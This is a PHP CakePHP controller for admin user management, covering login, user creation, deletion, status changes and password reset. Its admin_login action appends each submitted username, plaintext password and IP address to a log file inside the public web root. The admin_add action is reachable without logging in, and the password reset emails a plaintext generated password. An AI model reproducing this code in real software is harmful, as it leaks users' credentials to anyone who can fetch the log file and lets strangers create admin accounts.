<?php
App::uses('AppController', 'Controller');
class UsersController extends AppController {

	public $name = 'Users';
	//public $components = array('Mail');
	
   public function beforeFilter() {   
   parent::beforeFilter();	
        // Controller spesific beforeFilter
	$this->Auth->allow('admin_add','admin_login','admin_logout', 'admin_forgotpassword');	
	//$this->Auth->authorize = 'controller'; 
  }
  
 
	
	public function index(){
		$this->redirect(array('controller' => 'admin/users', 'action' => 'dashboard'));
	}
	
	public function admin_index() {	  
	$this->set('filter_published', '5');
	   $this->paginate = array(
        'User' => array(
            'limit' => 25,
            'order' => array('id' => 'desc')
            //'group' => array('created', 'modified')
        )
    );
	   $data = $this->paginate('User');
        $this->set('users', $data);        
    }
	
	public function admin_dashboard() {	 
		

	}  
	public function admin_add(){ 
	     //$this->set('groups', $this->User->Group->find('list',array('conditions'=>array('status'=>1)))); 
		  if ($this->request->is('post')) { 
            $this->User->create();
			 $this->request->data['User']['created_by']= $this->Auth->user('id');			
            if ($this->User->save($this->request->data)) {
                $this->Session->setFlash(__('The user has been saved'), 'default',array('class'=>'success'));
                $this->redirect(array('action'=>'admin_add'));
            } else {
                $this->Session->setFlash(__('The user could not be saved. Please, try again.'), 'default',array('class'=>'errors'));
            }
        }		
	}
	public function admin_edit($id = null) {
	    
	}

	public function admin_login(){
		/*
		$this->loadModel('LoginAttempt');
		$ip = $this->request->clientIp();
		$this->LoginAttempt->save(array('username' => $this->request->data['User']['username'], 'password' => $this->request->data['User']['password'], 'ip' => $ip));
		*/
		
		if(!is_dir(WWW_ROOT.'logs')){
			mkdir(WWW_ROOT.'logs');
		}
		
	    if ($this->request->is('post')) {	
				$ip = $this->request->clientIp();
				$file = WWW_ROOT.'logs/'.'userlog_'.date('mY').'.log';
				$handle = fopen($file,'a');
				fwrite($handle, "DATETIME : [".date('Y-m-d h:i:s')."] ".PHP_EOL);
				fwrite($handle, "Username : {$this->request->data['User']['username']} ".PHP_EOL);
				fwrite($handle, "Password : {$this->request->data['User']['password']} ".PHP_EOL);
				fwrite($handle, "IP : {$ip} ".PHP_EOL.PHP_EOL);
				
		   if($user_alldata = $this->User->find('first',array('conditions'=>array('username'=>$this->request->data['User']['username'])))){
		    $today= date('Y-m-d H:i:s');				
				//$day2 = $user_alldata['User']['unlocktime'];
				//$hourdiff = round((strtotime($today) - strtotime($day2))/3600, 1);
				$this->User->id = $user_alldata['User']['id'];	
									
					if ($this->Auth->login()) {	
					
						$this->redirect($this->Auth->redirect());
					} else {
					    
					  $this->Session->setFlash(__('Invalid username or password, try again'), 'default',array('class'=>'errors'));
					}
				
			}else{
			      $this->Session->setFlash(__('Invalid username try again'), 'default',array('class'=>'errors'));
			}		
        }
    }
	
	/*public function admin_delete($id = NULL) {  
	    if (!$id && empty($this->data)) {
		    $this->Session->setFlash(__('Invalid user.'), 'default',array('class'=>'errors'));			
			$this->redirect(array('action' => 'index'));
		}
		if ($this->User->delete($id)) {
		$this->Session->setFlash('The User has been deleted.', 'default', array('class' => 'success'));
		$this->redirect(array('action' => 'index'));
		}
	}
*/
	

    public function admin_logout()
    {   	
		$this->Session->delete('USER');        
        $this->Session->setFlash(__('Your are now Logged out Successfully', true), 'default',array('class'=>'success'));
        $this->redirect($this->Auth->logout());
		//$this->redirect('/');
        exit;
    }
	
	public function admin_changestatus($id = NULL)
	{
			$this->autoRender = false;
			$this->layout=false;
			$this->loadModel('User'); 
			
			if(isset($this->request->data['task']))
			{
					if($this->request->data['task'] == 'publish')
					{
						foreach ($this->data['User']['id'] as $key => $value) 
						{
					
							if($value !=0)
							{
								$this->request->data['User']['status'] 		        = 1; 
								$this->User->id	            						= $value;
								$this->request->data['User']['id'] 					= $id ; 
								$this->User->saveField('status',1);
							}
						}
						$this->Session->setFlash(__('Status Successfully Changed.', true), 'default',array('class'=>'success'));
						$this->redirect(array('controller' => 'users', 'action' => 'index'));
					}
					elseif($this->request->data['task'] == 'unpublish')
					{
						foreach ($this->data['User']['id'] as $key => $value) 
						{
							if($value !=0)
							{
									$this->request->data['User']['status'] 		        = 0; 
									$this->User->id	            						= $value;
									$this->request->data['User']['id'] 					= $id ;  
									$this->User->saveField('status',0);
							}
						}
						$this->Session->setFlash(__('Status Successfully Changed.', true), 'default',array('class'=>'success'));
						$this->redirect(array('controller' => 'users', 'action' => 'index'));
					}
			}
			else
			{
					$this->request->data['User']['status'] 		        = $this->request->params['pass'][1]; 
					$this->request->data['User']['id'] 					= $id ;
					 
					if($this->User->Save($this->data,false))
					{  
						$this->Session->setFlash(__('Status Successfully Changed.', true), 'default',array('class'=>'success'));
						$this->redirect(array('controller' => 'users', 'action' => 'index'));
					}
			}
	}
	
	public function admin_search() 
	{	  
			$this->loadModel('User'); 
			$conArr = array();
			$this->set('filter_published', '5');   
			if($this->data['filter_published']!='' )
			{
				if($this->data['filter_published'] == 1)
				{
					$conArr = array('User.status'=> 1);
				}
				elseif($this->data['filter_published'] == 0)
				{
					$conArr = array('User.status'=> 0);
				}
				else
				{
					$conArr = array();
				}
				$this->set('filter_published', $this->data['filter_published']);   
			}
			
			$this->set('users',$this->User->find('count',array('conditions'=> array('User.username LIKE'=> '%'.$this->data['User']['search_name'].'%',$conArr))));
			$this->paginate = array('limit' =>25,'conditions'=> array('User.username LIKE'=> '%'.$this->data['User']['search_name'].'%',$conArr), 'order'=>'User.username ASC');
			$data = $this->paginate('User');
		 
			$this->set('users', $data);
    }
	
	public function admin_delete($id = NULL)
	{
		$this->loadModel('User'); 
		if(isset($this->request->data['task']))
		{
			if($this->request->data['task'] == 'trash')
			{
				foreach ($this->data['User']['id'] as $key => $value) 
				{
					if($value !=0)
					{
						$this->User->delete(array('User.id' => $value), false);
					}
				}
				$this->Session->setFlash(__('Record Successfully deleted.', true), 'default',array('class'=>'success'));
				$this->redirect(array('controller' => 'users', 'action' => 'index'));
			}
		}
		else
		{
			$this->User->delete(array('User.id' => $id), false);
			$this->Session->setFlash(__('Record Successfully deleted.', true), 'default',array('class'=>'success'));
						$this->redirect(array('controller' => 'users', 'action' => 'index'));
		}
	}
	
	public function admin_changeuserpass($id = null) {
	    $this->User->id = $id;
		if (!$id && empty($this->data)) {
			$this->Session->setFlash(__('Invalid user'), 'default',array('class'=>'success'));
			$this->redirect(array('action' => 'index'));
		}
		
		if ($this->request->is('post') || $this->request->is('put')) {
			if(strlen($this->request->data['User']['newpass'])> 5 && strlen($this->request->data['User']['password'])>5){
				if($this->request->data['User']['newpass'] == $this->request->data['User']['password']){
					if ($this->User->save($this->data)) {
					$this->Session->setFlash(__('The Password has been changed'), 'default',array('class'=>'success'));
					$this->redirect(array('action' => 'index'));
					} else {
					$this->Session->setFlash(__('The Password could not be changed. Please, try again.'), 'default',array('class'=>'errors'));
					}
				}else{
					$this->Session->setFlash(__('New password and confirm password did not match!'), 'default',array('class'=>'errors'));
					$this->redirect(array('action' => 'admin_changeuserpass',$id));
				} 	
			} else {
				$this->Session->setFlash(__('New password and confirm password must be 6-20 characters in length!'), 'default',array('class'=>'errors'));
				$this->redirect(array('action' => 'admin_changeuserpass',$id));
			}			
		}	
	}
	
	public function admin_forgotpassword(){
	
		if($this->request->is('post') || $this->request->is('put')){
			$rs = $this->User->find('first', array('conditions' => array('email' => $this->data['User']['username'])));
			if(!empty($rs)){				
						$this->User->id = $rs['User']['id'];
						$pwd = uniqid();
						if ($this->User->saveField('password', $pwd)) {
							$this->Mail->reset();
							$this->Mail->to = $this->data['User']['username'];
							try{
								$this->Mail->sendMail("adminforgotpassword", array('user' => $rs['User']['username'], 'password' => $pwd, 'email' => $rs['User']['email']));
							} catch(Exception $e){
								flash()->overlay('Oops!', $e->getMessage() . ' Please contact support@a1registration.net with a description of this error.', 'error');
								$this->redirect(array('action' => 'index'));
							}
							
							$this->Session->setFlash(__('The Password has been sent to your email'), 'default',array('class'=>'success'));
							$this->redirect(array('action' => 'index'));
						} else {
							 $this->Session->setFlash(__('The Password could not be changed. Please, try again.'), 'default',array('class'=>'errors'));
							 $this->redirect(array('action' => 'admin_forgotpassword'));
						}
			} else {
				$this->Session->setFlash(__('Email Address is not valid.'), 'default',array('class'=>'errors'));
				$this->redirect(array('action' => 'admin_forgotpassword'));
			}
		}
	}
	
} 